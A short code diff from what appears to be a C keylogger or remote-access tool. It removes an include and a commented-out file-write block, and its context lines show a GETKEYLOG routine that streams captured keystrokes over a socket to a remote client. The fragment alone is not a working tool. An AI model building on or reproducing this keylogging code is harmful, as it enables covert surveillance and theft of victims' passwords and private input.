@@ -4,7 +4,6 @@
 
 #include "command.h"
 #include "../common/common.h"
-#include "../common/socket.h"
 
 
 // OPERASI UNTUK ARRAY COMMAND 
@@ -89,13 +88,6 @@ void GETKEYLOG(void * paramT){
 		send((param)->clientSocket, buffer, strlen(buffer), 0);
 		memset(buffer, 0, strlen(buffer));
 		Sleep(101);
-
-		/*
-		if (fputs(buffer, destination_file) == EOF) {
-			perror("Error writing to destination file");
-			break; // Exit the loop on write error.
-		}
-		*/
 	}
 
 	strcpy(buffer, "ENDGETFILE");
